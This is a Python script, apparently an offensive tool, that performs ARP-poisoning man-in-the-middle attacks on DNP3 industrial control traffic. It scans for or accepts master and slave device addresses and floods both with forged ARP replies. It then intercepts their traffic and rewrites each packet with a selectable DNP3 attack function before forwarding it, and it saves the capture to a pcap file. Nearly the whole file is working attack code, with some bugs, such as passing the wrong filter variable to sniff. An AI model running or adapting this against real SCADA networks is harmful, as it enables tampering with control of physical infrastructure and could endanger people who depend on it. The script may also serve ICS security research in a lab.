#!/usr/bin/python 

from threading import Thread
from time import sleep
from datetime import datetime

from portScan import *
from DNP3_Lib_MITM import *
from interfaces import *


attackerIP = ""
attackerMAC = ""

masterIP = ""
masterMAC = ""

slaveIP = ""
slaveMAC = ""

masterARP = ""
slaveARP = ""


def configure_arp(masterMAC, masterIP, slaveMAC, slaveIP):
    arp = ARP()
    arp.op = 2

    masterARP = ARP()
    slaveARP = ARP()

    masterARP.op = 2
    slaveARP.op = 2

    masterARP.psrc = slaveIP
    masterARP.pdst = masterIP
    masterARP.hwdst = masterMAC

    slaveARP.psrc = masterIP
    slaveARP.pdst = slaveIP
    slaveARP.hwdst = slaveMAC

    print "SLAVE", slaveARP.summary()
    print "MASTER", masterARP.summary()

    return masterARP, slaveARP


def configure_mitm():
    masterMAC = raw_input('Master MAC Address (CAPS): \n > ')
    masterIP = raw_input('Master IP Address: \n > ')

    if (masterMAC or masterIP) == "":
        return False

    slaveMAC = raw_input('Slave MAC Address (CAPS): \n > ')
    slaveIP = raw_input('Slave IP Address: \n > ')

    if (slaveMAC or slaveIP) == "":
        return False

    masterARP, slaveARP = configure_arp(masterMAC, masterIP, slaveMAC, slaveIP)

    write_to_config = raw_input('Save to Configuration File? (Y or N): \n > ')
    if write_to_config == 'y' or write_to_config == 'Y':
        write_config({'master': {'mac': masterMAC, 'ipv4': masterIP},
                        'slave': {'mac': slaveMAC, 'ipv4': slaveIP},
                        'attacker': {'mac': '', 'ipv4': ''}})

    return True, masterARP, slaveARP


def configure_host(host):
    if 'ipv4' in host and 'mac' in host:
        return host['ipv4'], host['mac']
    else:
        "^^ NO MAC OR IP >>> ERROR!!!!"
        quit()


def nmap_scan():
    hosts = scan_interface(interface=select_interface(), verbose=1)
    master = int(raw_input('Master device: '))
    masterIP, masterMAC = configure_host(hosts[master-1])
    print "IP", masterIP, "Mac", masterMAC

    if masterMAC == "" or masterIP == "":
        return False

    slave = int(raw_input('Slave device: '))
    slaveIP, slaveMAC = configure_host(hosts[slave-1])
    print "IP", slaveIP, "Mac", slaveMAC

    if slaveMAC == "" or slaveIP == "":
        return False

    write_to_config = raw_input('Save to Configuration File? (Y or N): \n > ')
    if write_to_config == 'y' or write_to_config == 'Y':
        write_config({'master': {'mac': masterMAC, 'ipv4': masterIP},
                        'slave': {'mac': slaveMAC, 'ipv4': slaveIP},
                        'attacker': {'mac': '', 'ipv4': ''}})

    masterARP, slaveARP = configure_arp(masterMAC, masterIP, slaveMAC, slaveIP)
    return True, masterARP, slaveARP


config_mitm = False
while config_mitm is False:
    option = raw_input(' 1) Scan \n 2) Configure\n 3) Configuration File\n> ')
    if option == '1':
        config_mitm, masterARP, slaveARP = nmap_scan()

    elif option == '2':
        config_mitm, masterARP, slaveARP = configure_mitm()

    elif option == '3':
        host = read_config()
        masterMAC=host['master']['mac']
        masterIP=host['master']['ipv4']
        slaveMAC=host['slave']['mac']
        slaveIP=host['slave']['ipv4']
        masterARP, slaveARP = configure_arp(masterMAC, masterIP, slaveMAC, slaveIP)
        config_mitm = True
    else:
        print "Try again!!"


#print masterARP.show2()
#print slaveARP.show2()

masterIP = masterARP.pdst.lower()
masterMAC = masterARP.hwdst.lower()

print "Master", masterMAC, masterIP

slaveIP = slaveARP.pdst.lower()
slaveMAC = slaveARP.hwdst.lower()

print "Slave", slaveMAC, slaveIP

attackerIP = getLocalhostIP('eth0')
attackerMAC = slaveARP.hwsrc.lower()

print "Attacker MAC =", attackerMAC
print "Attacker IP =", attackerIP

print "\nConfiguration Complete!"
print red("***** Man-In-The-Middle DNP3 ******")

selected_attack = choose_DNP3_attack()

def got(pkt):
    if pkt.haslayer(Ether):
        if pkt.haslayer(ARP):
            if pkt[Ether].src == slaveMAC:
                print red("DROPPING"), pkt.summary()
            elif pkt[Ether].src == masterMAC:
                print red("DROPPING"), pkt.summary()
            return

        if pkt[Ether].dst == attackerMAC:
            if pkt[Ether].src == slaveMAC:
                pkt = selected_attack(pkt)
                pkt[Ether].dst = masterMAC
                print red("FROM SLAVE TO MASTER"), red(pkt.summary())
                pkt[Ether].src = attackerMAC


            elif pkt[Ether].src == masterMAC:
                pkt = selected_attack(pkt)
                pkt[Ether].dst = slaveMAC
                print red("FROM MASTER TO SLAVE"), red(pkt.summary())
                pkt[Ether].src = attackerMAC

            else:
                print red("========================")
                print red("Error"), pkt.summary()
                print "SRC=", pkt[Ether].src,
                print "DST=", pkt[Ether].dst
                print "slave", slaveMAC
                print "master", masterMAC
                print red("========================")
                return

            sendp(pkt, verbose=0)
            return

        print pkt.summary()

def arp_reset():
    arp = ARP()
    arp.op = 2

    masterARP = ARP()
    slaveARP = ARP()

    masterARP.op = 2
    slaveARP.op = 2

    masterARP.psrc = slaveIP
    masterARP.pdst = masterIP
    masterARP.hwdst = masterMAC
    masterARP.hwsrc = slaveMAC

    slaveARP.psrc = masterIP
    slaveARP.pdst = slaveIP
    slaveARP.hwdst = slaveMAC
    slaveARP.hwsrc = masterMAC

    send(masterARP, verbose=0)
    send(slaveARP, verbose=0)
    print red("REPAIR")


def arp_posioning(masterARP, slaveARP):
    while attack:
        print "ARP Poisoning"
        send(masterARP, verbose=0)
        send(slaveARP, verbose=0)
        sleep(10)


time_now = datetime.now().strftime("%Y%m%d_%H%M%S.pcap")
filename = "mitm/" + selected_attack.__name__ + "_" + time_now
print "saving to", filename
open(filename, 'w')

packet_count = raw_input('Number of Packets to Intercept? \n >')

sniffed = None
attack = True
while attack:
    print masterIP, masterMAC, slaveIP, slaveMAC
    thread = Thread(target = arp_posioning, args=(masterARP, slaveARP))
    thread.start()
    _filter = "(ether src %s) or (ether src %s)" % (masterMAC, slaveMAC)
    print _filter
    sniffed = sniff(prn=got,filter= filter, count=int(packet_count))
    print "FINISHED"
    arp_reset()
    print "Writing capture to File...", filename
    attack = False
    thread.join()

wrpcap(filename, sniffed)

